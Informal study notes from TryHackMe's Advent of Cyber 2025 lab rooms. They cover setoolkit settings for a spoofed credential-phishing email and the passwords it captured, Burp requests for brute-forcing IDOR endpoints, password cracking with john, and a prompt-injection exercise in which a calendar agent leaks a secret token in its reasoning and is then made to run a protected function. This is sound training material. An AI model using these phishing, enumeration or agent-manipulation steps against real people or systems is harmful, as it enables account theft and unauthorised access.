---
title: "adventofcyber2025"
tags:
  - fetus
---
- wont be covering day 0 and 1 in this note cuz boring as hell who tf doesnt know basic linux cli ToT
- key for sidequest went something like now_you_see_me
# Day 2: Phishing https://tryhackme.com/room/phishing-aoc2025-h2tkye9fzU
- its a subset of social engineering
- mutiple types exist including but not limited to:
	- smishing
		- phishing via short text messages
	- vishing 
		- phisihing via voice calls 
	- quishing
		- phishing via QR codes 
	- social media direct messages
- TBFC Cyber Security awareness teaches two anti phishing mnemonics 
	- S.T.O.P. (from all things secured)
		- Suspicious?
		- Telling me to click something?
		- Offering me an amazing deal?
		- Pushing me to do something now?
	- S.T.O.P.
		- Slow down. Scammers run on your adrenaline.
		- Type the address yourself. Don’t use the message’s link.
		- Open nothing unexpected. Verify first.
		- Prove the sender. Check the real From address/number, not just the display name.
- task files included the server files to set up the cred capture phishing page. gonna use [[setoolkit]] for email phishing. options used for task:
```c
- 2. one-time use email template
- subject of the email: factory@wareville.thm
- send the message as html or plain? 'h' or 'p': p
- enter body of the message: Dear elves,
  Kindly note that there have been significant changes to the shipping schedules due to increased shipping orders.
  Please confirm the new schedule by visiting http://192.168.150.115:8000
  Best regards,
  Flying Deer 
  END
- How to deliver the email: Use your own server or open relay
- From address: We know that the guys at the toy factory communicate regularly with Flying Deer, the shipping company, so that we will use `updates@flyingdeer.thm` as the source email address
- From name: Flying Deer
- Username for open-relay: We will leave it blank and just hit the Enter key
- Password for open-relay: We will leave it blank and just hit the Enter key
- SMTP email server address: We will deliver directly to the TBFC mail server by entering `10.48.169.181`.
- Port number for the SMTP server: We leave the default value of `25` and just hit the Enter key
```
- captured creds after 1-2 mins of sending the mail: <br>
![[adventofcyber2025day02CredsGottenSS.png]]
```sh
admin:unranked-wisdom-anthem
```
- cant login to admin with creds but the pass has been reused for the `factory` user 
```sh
factory:unranked-wisdom-anthem
```
- one of two mails in the inbox of user `factory`:
```txt fold title:"mail"

Urgent: Production & Shipping Request — 1984000 Units (Next 2 Weeks)
Contact photo
From marta on 2025-10-10 09:34
Details Headers
Hi team,

I hope everyone is well and caffeinated (or at least in possession of a reliable tea cup). I’m writing to confirm a high-priority request that landed on our desk this morning and to lay out the operational details so we can move quickly and cleanly.

The request: the client has asked us to manufacture and ship 1984000 toys to a mix of retail partners and charitable distribution centers within the coming couple of weeks. I know — it’s a big number, but one we can handle if we coordinate across production, QC, packing, and logistics without dropping the ball.

Why this matters (beyond revenue): we all know, and the client reiterated, how crucial these toys are. They’re not just products; they’re tools for learning, imagination, and early development. Play helps children build motor skills, emotional resilience, and social capacity. Some of these units are earmarked for under-resourced communities, where access to developmentally appropriate playthings can make a measurable difference in cognitive and social outcomes. So yes, it’s a big manufacturing ask — but it’s also important work. That human impact matters as much as any spreadsheet line.

Operational summary and immediate asks:

Production planning

Target output: ramp to sustained runs that will produce the requested volume across our three main production lines. We’ll need each line to hit overtime shifts where possible; please outline how many extra hours per line and how many additional operators we can realistically have on short notice.

Materials check: procurement to confirm availability of plastics, fabrics, fasteners, and packaging stock. If any single supplier cannot cover the needed volume, procurement to list alternatives and lead times by EOD today.

Molds & tooling: maintenance — ensure spare tooling is prepped and inspected. If any tooling requires rework, flag immediately so we can swap in backups and avoid downtime.

Quality control

Given scale, QC must be tightened, not loosened. We need a balance: maintain our safety and compliance thresholds while moving product fast.

Propose a spot-check cadence of 1% per batch minimum, with a higher 3% check for first-run batches of any SKU that hasn’t run in the last 90 days.

QA to prepare rapid-failure protocols for the assembly lines so a defect spike doesn’t propagate.

Packing & labeling

Standard retail pack vs. bulk charitable pack options. The client will take a mix; marketing will confirm the final split by tomorrow. Packaging materials must be pre-staged to avoid a bottleneck.

Please confirm barcode/label templates and EAN assignment. If reprinting is needed, coordinate with print vendor immediately.

Logistics & shipping

The client has requested shipment windows within the next two weeks. Logistics to prepare multi-modal plans: palletized ocean freight for long-lead shipments plus expedited trucks for regional retail drops.

Customs documentation needs to be queued now for the international consignments. Export compliance: customs forms and safety certification documents to be attached to each container manifest.

We should provision for a buffer in our manifests to accommodate last-minute retailer changes — suggest holding 2–3% of production as immediate reserve stock.

Staffing & shifts

HR: confirm overtime policies, temporary staffing SOWs, and health/safety briefings for new temps. Training materials for new joiners must be concise and focused on safety-critical tasks.

Line supervisors: prepare line-specific checklists for ramp-up and shift handovers. Handoffs must be written and signed to reduce communication drift.

Communication & client updates

Weekly cadence calls won’t cut it here. Let’s move to daily short stand-ups with the client points of contact until the major shipments clear.

Sales/Account to draft a concise client update template so notifications are consistent (production %, shipments scheduled, any risks).

Risk points (so we can be proactive)

Components shortage: small critical components can cause line stops. Procurement must identify single-supplier risks today.

Regulatory: any new country-specific safety regs not previously encountered could delay exports. Compliance to double-check all destination requirements.

Quality spikes: if we see a defect cluster, be prepared to pause affected lines for root cause. This is preferable to shipping a recall risk.

A few practical notes and suggestions

Please prioritize SKUs that have the fewest unique components where possible; consolidation reduces changeover time.

For packaging, use standardized pallet configurations to maximize container fill and minimize handling.

Stagger load-out windows to avoid bottlenecks at the dock. If we can spread shipments across early mornings and late-night slots, port congestion risk reduces.

Suggest we reserve one cross-dock facility near the main distribution hubs for rapid rework if a small percentage of product requires late-stage correction.

On the human side: some real talk
We’re asking a lot of the floor teams, QA, packers, and drivers. A quick morale note: we’ll plan small daily briefings and a debrief at the end of the cycle to capture lessons and recognize the extraordinary effort. If anyone needs scheduled breaks or rotation adjustments to avoid fatigue, supervisors please let me know — safety first, always.

Also, because we’ll have some units going to charity partners, we have a chance to tell a small, meaningful story about our brand. If Marketing can prepare a short insert explaining proper play use and safety — ideally printed on recyclable stock — it’d add real value for caregivers receiving these toys. A one-page insert could be the difference between a forgotten toy and one that’s actively used for learning.

Immediate deliverables (by EOD today)

Procurement: materials availability & alternate suppliers.

Production managers (all lines): feasible overtime hours and operator availability.

QA: proposed spot-check protocol and first-run higher-cadence checks.

Logistics: preliminary shipping plan (by mode, estimated dates, customs actions).

HR: temp staffing numbers and training plan.

Repeat confirmation: the total requested to be manufactured and shipped is 1984000 units. Please treat that figure as the baseline for all downstream planning until the client tells us otherwise.

If anyone sees an obstacle that I haven’t anticipated, flag it now. I want to avoid surprises mid-run. For transparency: I’ll consolidate your updates into a single action tracker and circulate it after the EOD check-ins.

Thanks for jumping on this quickly. I know long runs like this are a grind, but they’re also the kind of challenge that shows what we can do when we’re coordinated and focused. Plus, imagine the kid who gets one of those toys and lights up — that’s the short version of why this matters. If we pull this off cleanly, it’s good for business, good for reputation, and frankly, it’s the kind of thing we can feel proud of at the end of a long week.

Sign-off logistics

If you’re owning a deliverable from the “Immediate deliverables” list, please reply-all with your yes/no and any immediate caveats.

I’ll host a 15-minute sync at 08:30 tomorrow to walk through the procurement and logistics updates; calendar invite to follow.

Thanks again — let’s get this moving.

Best,
Marta
```
- also found 2 more email addresses which im too lazy to get into for now. maybe possible side quest???
```sh
marta@wareville.thm
mayor@wareville.thm
```
# Day 3: Splunk basics https://tryhackme.com/room/splunkforloganalysis-aoc2025-x8fj2k4rqp
 - got access to the splunk enterprise instance via the provided link in the room after starting the target machine <br>
 ![[adventofcyber2025Day03SplunkInstanceSS.png]]
 - the data has been pre ingested for us to investigate
 - went into `search and reporting`and set the scope to `All time` and searched for `index=main`. 2 source types of data. `web_traffic` `firewall_logs` <br>
![[adventofcyber2025day03sourceTypeSS.png]]
- lets investigate the web traffic first. clicking on the blue `web_traffic` text automatically appends this query to the existing query in the search bar: `sourcetype=web_traffic`. this pattern continues for all blue texts :p so we can basically filter for anything we want. even works for specific values of parameters or parameters themselves which is pretty neat 
- green timeline above shows a wierd bump in web traffic between 10-10-2025 to 14-10-2025 with the peak amount of traffic being in 12-10-2025. lets investigate what happened
- `sqlmap` and `havij` stands out like sore thumbs in the crowd of data from IP `198.51.100.55`. its the attacker IP. lets see what hes been upto <br>
![[adventofcyber2025day03useragentsFromAttackerSS.png]]
- damn broski has been busy. 658 attempts at path traversal too <br>
![[adventofcyber2025day03attackerPathTraversalAttemptsSS.png]]
- a ton of upload logs too. dude looted like a freaking goblin ToT lets see what the firewall logs say <br>
![[adventofcyber2025day03firewallLogsUploadSS.png]]
- alot of looting happened with 285 events. lets see how many bytes got transferred by adding up all the values in the `bytes_transferred` parameter similar to how we do it in MS Excel by appending `|  stats sum(bytes_transferred)` in the query and shifting to the stats tab from above the timeline :p <br>
![[adventofcyber2025day03sumOfTransferredBytesSS.png]]
- damn. thats the room completed. splunk seems like fun. gotta learn how to deploy my own instance with normal users generating generic traffic and attackers attacking malicious traffic from different subnets later after exams are over 
# Day 4: AI in Security https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB
- summary:
	- has good sides and bad sides. must be used carefully as an addative thing to boost productivity and automate not as a crutch 
	- example usecases:
		- generating quick exploit scripts to test stuff
		- automating long analysis and tedious blue team stuff 
		- source code auditing as a SAST(Static Application Security Testing)/DAST(Dynamic Application Security Testing) scanner for scanning code and scanning running applications for vulns 
# Day 5: IDOR https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
- its basically having unauthorised access to stuff due to (proper) lack of authentication/authorization checks
- authentication happens every request with session cookies and stuff and not only when logging in :p oh and authorization comes AFTER authentication 
- vertical vs horizontal priv esc:
	- vertical: access to additional new stuff 
	- horizontal: access to similar stuf
- IDOR is usually horizontal priv esc
- lets get to trying it for ourselves shall we
- sitemap after interacting with the functionality a bit: <br>
![[adventofcyber2025day5IDORsitemapSS.png]]
- 3 interesting API calls that retrieve account information. already did IDOR on all 3. gonna note down how for each one:
### first IDOR with `user_id=` parameter
- request:
```http
GET /api/child/b64/Mg== HTTP/1.1
Host: 10.48.152.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.48.152.22/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjcxMzEzNTV9.l_6w60i-8MuS4S5pacxKeeNquln7O8uFYmuxt19JeZw
DNT: 1
Connection: keep-alive
Priority: u=0


```
- response:
```http
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 30 Dec 2025 21:01:39 GMT
Content-Type: application/json
Content-Length: 76
Connection: keep-alive

{"child_id":2,"first_name":"Bilboo","parent_id":10,"birthdate":"2008-05-01"}
```
- sent the request to intruder in burp and brute forced the id parameter with a number list of 0 to 100 :D the user with 10 children is user id 15
### second IDOR with base64 encoded child id
- request:
```http
GET /api/child/b64/Mg== HTTP/1.1
Host: 10.48.152.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.48.152.22/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjcxMzEzNTV9.l_6w60i-8MuS4S5pacxKeeNquln7O8uFYmuxt19JeZw
DNT: 1
Connection: keep-alive
Priority: u=0


```
- response:
```http
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 30 Dec 2025 20:57:49 GMT
Content-Type: application/json
Content-Length: 75
Connection: keep-alive

{"child_id":2,"first_name":"Bilbo","parent_id":10,"birthdate":"2008-05-01"}
```
- `Mg==` is just base64 encoded `2` so brute forced it in burp with a simple number list with payload processing set to base64 encoding
### third IDOR with md5 hashed child id
- request:
```http
GET /api/child/md5/c81e728d9d4c2f636f067f89cc14862c HTTP/1.1
Host: 10.48.152.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.48.152.22/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjcxMzEzNTV9.l_6w60i-8MuS4S5pacxKeeNquln7O8uFYmuxt19JeZw
DNT: 1
Connection: keep-alive
Priority: u=4


```
- response:
```http
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 30 Dec 2025 21:01:49 GMT
Content-Type: application/json
Content-Length: 79
Connection: keep-alive

{"child_id":2,"id_number":"8902035555","parent_id":10,"birthdate":"2008-05-01"}
```
- `c81e728d9d4c2f636f067f89cc14862c` is just MD5 hashed `2` here as well. generated an MD5 hashed number list of 0 to 100 and set it as the payload and brute forced it in the intruder here too 
- welp that was meh but IDOR yaayyy :P
# Day 6: Malware Analysis https://tryhackme.com/room/malware-sandbox-aoc2025-SD1zn4fZQt
- malware analysis is the process of examining a malicious file to understand its functionality, operation, and methods for defence against it
- two main branches of malware analysis:
	- static: analysing a file without executing it
	- dynamic: executing it and analysing its behaviour in real time 
- sandboxes are disposable isolated environmets to analyze/run malicious stuff in. use of sandboxes is part of the golden rule of malware analysis that being never run potentially dangerous stuff in devices you care about :P
- sample file to analyse is `HopHelper.exe`. we'll be doing both static and dynamic analysis on it
- quick checks for static analysis:
	- get the checksum and see if its already detected online 
	- do strings 
	- check imports (imports are basically a list of libraries and functions the application imports)
		- example: `CreateFileW` is used to create files 
	- check resources (resources are data like the icon and stuff. malware has been known to hide in resources.)
- used pestudio to do static analysis 
- used regshot to do a before and after comparison of the registry to see what the malware changes as part of dynamic analysis
- used procmon to capture process interaction while the malware runs and used the filter to filter out stuff we dont wanna see and found what the malware was doing. this room has a FUCK TON of DFIR tools that i wanna loot <br>
  ![[adventofcyber2025day6DFIRtoolsSS.png]]
# Day 7: network discovery https://tryhackme.com/jr/networkservices-aoc2025-jnsoqbxgky
- gonna skip noting this down cuz who tf doesnt know generic nmap 
# Day 8: prompt injection
- LLM - limited 
- agenting LLM - much smarter due to chain of thought (CoT) and being able to interact with stuff and pull realtime information and dynamically adapts to new information and loops between thought and action
- lets get to exploiting an agent 
- in our case its an agent that manages a calendar. doesnt do anything unauthorised or reveal anything in the main prompt and wont reset the theme without a "secret token" but reveals its functions and the secret token in its CoT bubble where the thinking process happenes <br>
![[adventofcyber2025day8thinkingLeak1SS.png]]
- reveals token `TOKEN_SOCMAS` further down the thinking bubble. apparently wont do shit without it
- used said revealed token and told it use the `reset_holiday` function with it since it wont execute it without it and yaay socmas is back hqhqhqhq <br>
![[adventofcyber2025day8socmasIsBackYay.png]]
# Day 9: Passwords and Cracking em https://tryhackme.com/room/attacks-on-ecrypted-files-aoc2025-asdfghj123
- passwords protect confidentiality only. doesnt stop someone with access to the file itself from guessing the pass (duh). so the protection is only as strong as the password itself :D
- two most common types of password guessing:
	- dictionary attacks 
		- wordlists basically. stuff people are likely to use 
	- brute-force/mask attacks 
		- brute-force by itself takes way too long. masks are used with them to reduce scope 
- two files to crack: `flag.pdf` and `flag.zip`. both password protected
### `flag.pdf`:
- used [[pdfcrack]] with rockyou to crack it
- used [[pdf2john]] and then [[john the ripper]] with the hash as well cuz why not 
- password was `naughtylist`
### `flag.zip`
- fcrackzip isnt on the attackbox. common tryhackmeattackbox L. used [[zip2john]] and then [[john the ripper]] like before as well 
```sh
ubuntu@tryhackme:~/Desktop$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 
Command 'fcrackzip' not found, but can be installed with:
sudo apt install fcrackzip
ubuntu@tryhackme:~/Desktop$ zip2john flag.zip | tee zip.hash
flag.zip/flag.txt:$zip2$*0*3*0*db58d2418c954f6d78aefc894faebf54*d89c*1d*b8370111f4d9eba3ca5ff6924f8c4ff8636055dce00daec2679f57bde1*57445596ac0bc2a29297*$/zip2$:flag.txt:flag.zip:flag.zip
ubuntu@tryhackme:~/Desktop$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
winter4ever      (flag.zip/flag.txt)     
1g 0:00:00:00 DONE (2025-12-31 21:43) 2.174g/s 8904p/s 8904c/s 8904C/s friend..sahara
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
- pas was `winter4ever` 
- theres a sidequest key hidden somewhere in this vm but im too lazy for it
# Day 10: SOC Alert Triaging https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2
- 